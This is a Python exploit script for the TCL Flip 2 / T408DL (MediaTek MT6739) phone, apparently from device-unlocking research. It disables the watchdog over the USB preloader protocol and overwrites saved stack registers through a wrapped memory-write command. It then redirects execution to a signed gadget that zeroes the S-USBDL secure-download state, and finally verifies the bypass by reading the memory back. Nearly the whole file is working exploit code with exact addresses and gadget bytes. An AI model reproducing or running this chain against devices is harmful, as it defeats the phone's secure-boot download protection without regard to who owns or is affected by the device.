#!/usr/bin/env python3
"""
TCL Flip 2 / T408DL S-USBDL Bypass Test

Stage 3C for TCL Flip 2 / T408DL (MT6739-family).

Goal: use the already-proven D3 saved-PC control to execute an existing
signed TCL code sequence that stores zero to the 32-bit S-USBDL state word
at 0x0010043C, then cleanly returns to the USB command loop.

This script STOPS after independent D0 readback proves:
    S-USBDL @ 0x0010043C == 0x00000000

It does NOT SEND_DA, JUMP_DA, write flash/storage, or modify g_da_verified.
Stage 1 is imported unchanged.
"""

from __future__ import annotations

import hashlib
import sys
import time
from pathlib import Path

import T408DL_preloader_catcher as stage1

EXPECTED_HW_CODE = 0x0699
CMD_READ16 = 0xD0
CMD_WRITE16_NO_ECHO = 0xD3
CMD_WRITE32 = 0xD4

WDT_ADDR = 0x10007000
WDT_VALUE = 0x22000064

S_USBDL = 0x0010043C
G_DA_VERIFIED = 0x0010935D

READ16_NORMAL_LR = 0x00202B17
HANDLER_R7 = 0x00200AD9
COMMAND_LOOP = 0x0020286D       # Thumb entry for 0x0020286C
ZERO_STORE_GADGET = 0x00205F27  # Thumb entry for 0x00205F26

# D3 frame low aliases.
D3_BASE_SLOT  = 0x000C0AAC
D3_COUNT_SLOT = 0x000C0AB0
D3_SAVE_R4    = 0x000C0AB8
D3_SAVE_R5    = 0x000C0ABC
D3_SAVE_R6    = 0x000C0AC0
D3_SAVE_R7    = 0x000C0AC4
D3_SAVE_LR    = 0x000C0AC8

# Continuation stack consumed by gadget's POP {r4,r5,r6,pc} after D3 returns.
CONT_R4 = 0x000C0ACC
CONT_R5 = 0x000C0AD0
CONT_R6 = 0x000C0AD4
CONT_PC = 0x000C0AD8
CHAIN_END = 0x000C0ADC

# D0 helper frame values that expose the handler's original registers.
D0_SAVE_R4 = 0x000C0ABC
D0_SAVE_R5 = 0x000C0AC0
D0_SAVE_R6 = 0x000C0AC4
D0_SAVE_LR = 0x000C0AC8

USB_TIMEOUT_MS = 2000
READ_CHUNK = 0x4000
WRITE_CHUNK = 0x200
PROGRESS_STEP = 0x10000

EXPECTED_PRELOADER_SHA256 = (
    "51e66c6568b79fe8a1face4932c94bd3b53a7e1e8d264c7425d4e8120c5e5827"
)
PRELOADER_RUNTIME_BASE = 0x00200F10

# Verified against stock image + saved live dump.
GADGET_BYTES = bytes.fromhex("00230448236070bd")
LOOP_BYTES = bytes.fromhex("0df10d070af0d0fd")


def stamp():
    try:
        return f"{stage1.ts():.6f}"
    except Exception:
        return f"{time.monotonic():.6f}"


def read_exact(ep_in, size, timeout_ms=USB_TIMEOUT_MS):
    out = bytearray()
    while len(out) < size:
        chunk = bytes(ep_in.read(size - len(out), timeout_ms))
        if not chunk:
            raise RuntimeError(
                f"USB returned zero bytes at 0x{len(out):X}/0x{size:X}"
            )
        out += chunk
    return bytes(out)


def echo_bytes(ep_out, ep_in, data):
    data = bytes(data)
    ep_out.write(data, USB_TIMEOUT_MS)
    got = read_exact(ep_in, len(data))
    if got != data:
        raise RuntimeError(
            f"Echo mismatch: TX={data.hex()} RX={got.hex()}"
        )
    return got


def rword(ep_in):
    return int.from_bytes(read_exact(ep_in, 2), "big")


def verify_stock_image_if_present():
    candidates = [
        Path(__file__).resolve().parent / "ota" / "stock" / "preloader_raw.img",
        Path(__file__).resolve().parent / "preloader_raw.img",
    ]

    for p in candidates:
        if not p.is_file():
            continue

        raw = p.read_bytes()
        sha = hashlib.sha256(raw).hexdigest()
        print(f"[Static] Found stock preloader: {p}")
        print(f"  SHA-256 = {sha}")

        if sha != EXPECTED_PRELOADER_SHA256:
            raise RuntimeError("Stock preloader SHA-256 mismatch; refusing")

        def at(addr, n):
            off = addr - PRELOADER_RUNTIME_BASE
            if off < 0 or off + n > len(raw):
                raise RuntimeError(f"Stock address outside image: 0x{addr:08X}")
            return raw[off:off+n]

        if at(0x00205F26, len(GADGET_BYTES)) != GADGET_BYTES:
            raise RuntimeError("Zero-store gadget bytes do not match stock image")

        if at(0x0020286C, len(LOOP_BYTES)) != LOOP_BYTES:
            raise RuntimeError("Command-loop bytes do not match stock image")

        print("  zero-store gadget signature: PASS")
        print("  command-loop signature:      PASS")
        return

    print("[Static] Stock preloader not found beside script; using proven constants.")


def write32_mtk(ep_out, ep_in, address, value):
    print(f"[{stamp()}] WRITE32 addr=0x{address:08X} value=0x{value:08X}")
    echo_bytes(ep_out, ep_in, bytes([CMD_WRITE32]))
    echo_bytes(ep_out, ep_in, address.to_bytes(4, "big"))
    echo_bytes(ep_out, ep_in, (1).to_bytes(4, "big"))

    initial = rword(ep_in)
    print(f"  initial status = 0x{initial:04X}")
    if initial > 0x0003:
        raise RuntimeError(f"WRITE32 initial status failure: 0x{initial:04X}")

    echo_bytes(ep_out, ep_in, value.to_bytes(4, "big"))

    final = rword(ep_in)
    print(f"  final status   = 0x{final:04X}")
    if final > 0x00FF:
        raise RuntimeError(f"WRITE32 final status failure: 0x{final:04X}")


def disable_watchdog(ep_out, ep_in):
    print()
    print("[WDT] Disabling MT6739 watchdog")
    print(f"  address = 0x{WDT_ADDR:08X}")
    print(f"  value   = 0x{WDT_VALUE:08X}")
    write32_mtk(ep_out, ep_in, WDT_ADDR, WDT_VALUE)


def wrapped_count_for_low_end(low_end_exclusive):
    low_end_exclusive = (int(low_end_exclusive) + 1) & ~1
    return 1 + (low_end_exclusive // 2)


def wire_to_low_memory(wire):
    if len(wire) < 2 or (len(wire) & 1):
        raise RuntimeError("Invalid wrapped READ16 wire length")
    src = wire[2:]
    low = bytearray(len(src))
    low[0::2] = src[1::2]
    low[1::2] = src[0::2]
    return low


def low_memory_to_wire(first_halfword, low):
    if len(first_halfword) != 2:
        raise ValueError("first_halfword must be exactly 2 bytes")
    if len(low) & 1:
        raise ValueError("low-memory replay length must be even")
    low = bytes(low)
    be = bytearray(len(low))
    be[0::2] = low[1::2]
    be[1::2] = low[0::2]
    return bytes(first_halfword) + bytes(be)


def stream_read(ep_in, total, label):
    out = bytearray()
    started = time.monotonic()
    next_report = PROGRESS_STEP

    while len(out) < total:
        want = min(READ_CHUNK, total - len(out))
        try:
            chunk = bytes(ep_in.read(want, USB_TIMEOUT_MS))
        except Exception as exc:
            elapsed = time.monotonic() - started
            print()
            print(f"  *** {label} STREAM INTERRUPTED ***")
            print(f"  received = 0x{len(out):X}/0x{total:X}")
            print(f"  elapsed  = {elapsed:.3f}s")
            print(f"  error    = {exc}")
            raise

        if not chunk:
            raise RuntimeError(f"{label} returned zero bytes at 0x{len(out):X}")

        out += chunk

        if len(out) >= next_report or len(out) == total:
            elapsed = time.monotonic() - started
            pct = len(out) * 100.0 / total
            print(
                f"  progress = 0x{len(out):X}/0x{total:X} "
                f"({pct:.1f}%, {elapsed:.3f}s)"
            )
            while next_report <= len(out):
                next_report += PROGRESS_STEP

    return bytes(out)


def wrapped_d0_snapshot(ep_out, ep_in, low_end_exclusive):
    low_end_exclusive = (int(low_end_exclusive) + 1) & ~1
    count = wrapped_count_for_low_end(low_end_exclusive)
    total = count * 2

    print()
    print("[D0] Fresh wrapped READ16 snapshot")
    print("  start             = 0xFFFFFFFE")
    print(f"  low end exclusive = 0x{low_end_exclusive:08X}")
    print(f"  count             = 0x{count:X} halfwords")
    print(f"  wire bytes        = 0x{total:X}")

    echo_bytes(ep_out, ep_in, bytes([CMD_READ16]))
    echo_bytes(ep_out, ep_in, (0xFFFFFFFE).to_bytes(4, "big"))
    echo_bytes(ep_out, ep_in, count.to_bytes(4, "big"))

    initial = rword(ep_in)
    print(f"  initial status    = 0x{initial:04X}")
    if initial > 0x00FF:
        raise RuntimeError(f"Wrapped D0 rejected: 0x{initial:04X}")

    wire = stream_read(ep_in, total, "D0")

    final = rword(ep_in)
    print(f"  final status      = 0x{final:04X}")
    if final > 0x00FF:
        raise RuntimeError(f"Wrapped D0 final status failure: 0x{final:04X}")

    low = wire_to_low_memory(wire)
    if len(low) < low_end_exclusive:
        raise RuntimeError("Decoded low-memory snapshot is too short")

    return wire, low, initial, final


def u32le(buf, addr):
    if addr < 0 or addr + 4 > len(buf):
        raise RuntimeError(f"u32 address outside snapshot: 0x{addr:08X}")
    return int.from_bytes(buf[addr:addr+4], "little")


def put32le(buf, addr, value):
    if addr < 0 or addr + 4 > len(buf):
        raise RuntimeError(f"put32 address outside replay: 0x{addr:08X}")
    buf[addr:addr+4] = int(value & 0xFFFFFFFF).to_bytes(4, "little")


def validate_state(low):
    r4 = u32le(low, D0_SAVE_R4)
    r5 = u32le(low, D0_SAVE_R5)
    r6 = u32le(low, D0_SAVE_R6)
    lr = u32le(low, D0_SAVE_LR)
    susbdl = u32le(low, S_USBDL)
    gate = low[G_DA_VERIFIED]

    print()
    print("[Validate] Fresh live state")
    print(f"  saved r4      = 0x{r4:08X}")
    print(f"  saved r5      = 0x{r5:08X}")
    print(f"  saved r6      = 0x{r6:08X}")
    print(f"  saved lr      = 0x{lr:08X}")
    print(f"  S-USBDL       = 0x{susbdl:08X}")
    print(f"  DA gate byte  = 0x{gate:02X}")

    if lr != READ16_NORMAL_LR:
        raise RuntimeError("D0 stack signature mismatch")
    if not (0x00200000 <= r4 < 0x00210000):
        raise RuntimeError("Unexpected handler r4")
    if not (0x00100000 <= r5 < 0x00110000):
        raise RuntimeError("Unexpected handler r5")
    if not (0x00200000 <= r6 < 0x00210000):
        raise RuntimeError("Unexpected handler r6")
    if susbdl != 0x00000022:
        raise RuntimeError(
            f"Unexpected pre-write S-USBDL value 0x{susbdl:08X}; refusing"
        )
    if gate != 0x00:
        raise RuntimeError(
            f"Unexpected pre-write DA gate 0x{gate:02X}; refusing"
        )

    return r4, r5, r6


def build_stage3c_replay(wire, low):
    original_r4, original_r5, original_r6 = validate_state(low)

    count = wrapped_count_for_low_end(CHAIN_END)
    replay_low = bytearray(low[:CHAIN_END])

    # Keep D3's active loop state coherent when its low aliases are replayed.
    put32le(replay_low, D3_BASE_SLOT, 0xFFFFFFFE)
    put32le(replay_low, D3_COUNT_SLOT, count)

    # On D3 return, r4 becomes the S-USBDL destination for the signed gadget.
    put32le(replay_low, D3_SAVE_R4, S_USBDL)
    put32le(replay_low, D3_SAVE_R5, original_r5)
    put32le(replay_low, D3_SAVE_R6, original_r6)
    put32le(replay_low, D3_SAVE_R7, HANDLER_R7)
    put32le(replay_low, D3_SAVE_LR, ZERO_STORE_GADGET)

    # Gadget at 0x00205F26:
    #   movs r3,#0
    #   ldr  r0,[pc,#0x10]
    #   str  r3,[r4]          <-- zero S-USBDL
    #   pop  {r4,r5,r6,pc}
    # Supply that POP with restored handler registers + command-loop PC.
    put32le(replay_low, CONT_R4, original_r4)
    put32le(replay_low, CONT_R5, original_r5)
    put32le(replay_low, CONT_R6, original_r6)
    put32le(replay_low, CONT_PC, COMMAND_LOOP)

    replay_wire = low_memory_to_wire(wire[:2], replay_low)
    expected = count * 2
    if len(replay_wire) != expected:
        raise RuntimeError(
            f"Replay geometry mismatch: 0x{len(replay_wire):X} != 0x{expected:X}"
        )

    # The replay itself must remain bounded below the security-state objects.
    if len(replay_low) >= S_USBDL:
        raise RuntimeError("Replay itself would directly reach S-USBDL; refusing")

    print()
    print("[Security] Building bounded S-USBDL bypass replay")
    print(f"  replay low end     = 0x{len(replay_low):08X}")
    print(f"  wire bytes         = 0x{len(replay_wire):X}")
    print(f"  D3 count           = 0x{count:X}")
    print(f"  D3 saved r4        = 0x{S_USBDL:08X}")
    print(f"  D3 saved PC        = 0x{ZERO_STORE_GADGET:08X}")
    print(f"  continuation PC    = 0x{COMMAND_LOOP:08X}")
    print("  direct replay reach = below S-USBDL")

    return replay_wire


def d3_write_replay(ep_out, ep_in, wire):
    if len(wire) < 4 or (len(wire) & 1):
        raise RuntimeError("Invalid D3 replay size")

    count = len(wire) // 2
    print()
    print("[Security] Applying bounded WRITE16_NO_ECHO replay")
    print("  start      = 0xFFFFFFFE")
    print(f"  count      = 0x{count:X} halfwords")
    print(f"  wire bytes = 0x{len(wire):X}")

    echo_bytes(ep_out, ep_in, bytes([CMD_WRITE16_NO_ECHO]))
    echo_bytes(ep_out, ep_in, (0xFFFFFFFE).to_bytes(4, "big"))
    echo_bytes(ep_out, ep_in, count.to_bytes(4, "big"))

    initial = rword(ep_in)
    print(f"  initial status = 0x{initial:04X}")
    if initial > 0x00FF:
        raise RuntimeError(f"D3 initial status failure: 0x{initial:04X}")

    sent = 0
    started = time.monotonic()
    next_report = PROGRESS_STEP

    while sent < len(wire):
        block = wire[sent:sent+WRITE_CHUNK]
        written = ep_out.write(block, USB_TIMEOUT_MS)
        if int(written) != len(block):
            raise RuntimeError(
                f"Short D3 write at 0x{sent:X}: {written}/{len(block)}"
            )
        sent += len(block)

        if sent >= next_report or sent == len(wire):
            elapsed = time.monotonic() - started
            pct = sent * 100.0 / len(wire)
            print(
                f"  progress = 0x{sent:X}/0x{len(wire):X} "
                f"({pct:.1f}%, {elapsed:.3f}s)"
            )
            while next_report <= sent:
                next_report += PROGRESS_STEP

    final = rword(ep_in)
    print(f"  final status   = 0x{final:04X}")
    if final > 0x00FF:
        raise RuntimeError(f"D3 final status failure: 0x{final:04X}")
    if final != 0x0000:
        raise RuntimeError(f"Unexpected D3 final status: 0x{final:04X}")


def verify_hw_code(ep_out, ep_in):
    print()
    print("[Verify] GET_HW_CODE after zero-store return")
    hwcode, hwver = stage1.get_hw_code(ep_out, ep_in)
    print(f"  HW_CODE = 0x{hwcode:04X}")
    print(f"  HW_VER  = 0x{hwver:04X}")
    if hwcode != EXPECTED_HW_CODE:
        raise RuntimeError("Command loop did not survive cleanly")
    print("  command loop survived: PASS")


def verify_security_state(ep_out, ep_in):
    # Read through the DA-gate byte so one independent command verifies both.
    end = (G_DA_VERIFIED + 1 + 1) & ~1
    _, low, initial, final = wrapped_d0_snapshot(ep_out, ep_in, end)

    if initial != 0x0000 or final != 0x0000:
        raise RuntimeError("Post-write D0 did not complete cleanly")

    susbdl = u32le(low, S_USBDL)
    gate = low[G_DA_VERIFIED]

    print()
    print("[Verify] Independent security-state readback")
    print(f"  S-USBDL @ 0x{S_USBDL:08X} = 0x{susbdl:08X}")
    print(f"  DA gate  @ 0x{G_DA_VERIFIED:08X} = 0x{gate:02X}")

    if susbdl != 0x00000000:
        raise RuntimeError(
            f"S-USBDL zero-store FAILED: read back 0x{susbdl:08X}"
        )

    if gate != 0x00:
        raise RuntimeError(
            f"DA gate changed unexpectedly to 0x{gate:02X}"
        )

    print("  S-USBDL zero readback: PASS")
    print("  DA gate unchanged:     PASS")


def main():
    print("TCL Flip 2 / T408DL S-USBDL Bypass Test")
    print("Volatile S-USBDL zero + independent readback")
    print("=" * 72)
    print()
    print("BOUNDARY:")
    print("  - volatile S-USBDL write only")
    print("  - g_da_verified must remain unchanged")
    print("  - no SEND_DA / JUMP_DA")
    print("  - no flash/storage writes")
    print("  - Preloader image remains untouched")

    verify_stock_image_if_present()

    dev = None
    try:
        print()
        print("[Preloader] Waiting for and capturing device...")
        dev = stage1.wait_for_preloader()
        print("[Preloader] Configuring USB transport...")
        intf, ep_out, ep_in = stage1.setup_usb(dev)
        print("[Preloader] Synchronizing MediaTek protocol...")
        stage1.sync_mtk(ep_out, ep_in)
        print("[Preloader] Verifying device identity...")
        hwcode, hwver = stage1.get_hw_code(ep_out, ep_in)

        if hwcode != EXPECTED_HW_CODE:
            raise RuntimeError(
                f"Unexpected HW_CODE 0x{hwcode:04X}; refusing"
            )

        print(f"  HW_CODE = 0x{hwcode:04X}")
        print(f"  HW_VER  = 0x{hwver:04X}")

        disable_watchdog(ep_out, ep_in)

        # One fresh live snapshot covers the D3 frame + both state objects.
        snapshot_end = (G_DA_VERIFIED + 2) & ~1
        wire, low, initial, final = wrapped_d0_snapshot(
            ep_out, ep_in, snapshot_end
        )
        if initial != 0x0000 or final != 0x0000:
            raise RuntimeError("Initial D0 snapshot did not complete cleanly")

        replay = build_stage3c_replay(wire, low)

        print()
        print("=" * 72)
        print("ABOUT TO APPLY VOLATILE S-USBDL ZERO-STORE")
        print("=" * 72)
        print(f"Target: S-USBDL word @ 0x{S_USBDL:08X} -> 0x00000000")
        print(f"Signed gadget: 0x{ZERO_STORE_GADGET:08X}")
        print(f"Clean continuation: 0x{COMMAND_LOOP:08X}")
        print("No SEND_DA will be attempted.")

        d3_write_replay(ep_out, ep_in, replay)
        verify_hw_code(ep_out, ep_in)
        verify_security_state(ep_out, ep_in)

        print()
        print("=" * 72)
        print("S-USBDL BYPASS SUCCESS")
        print("=" * 72)
        print("S-USBDL is independently read back as 0x00000000.")
        print("DA gate remains unchanged.")
        print("Command loop remains functional.")
        print("No SEND_DA, JUMP_DA, or flash/storage write was attempted.")
        return 0

    except KeyboardInterrupt:
        print()
        print("Interrupted by user.")
        return 130

    except Exception as exc:
        print()
        print("=" * 72)
        print("S-USBDL BYPASS ABORTED / FAILED CLOSED")
        print("=" * 72)
        print(f"ERROR: {exc}")
        print("Do not infer an S-USBDL bypass unless independent readback is exactly zero.")
        return 1

    finally:
        if dev is not None:
            print()
            print("Releasing Preloader USB session...")
            try:
                stage1.cleanup(dev)
            except Exception as exc:
                print(f"Cleanup warning: {exc}")


if __name__ == "__main__":
    sys.exit(main())
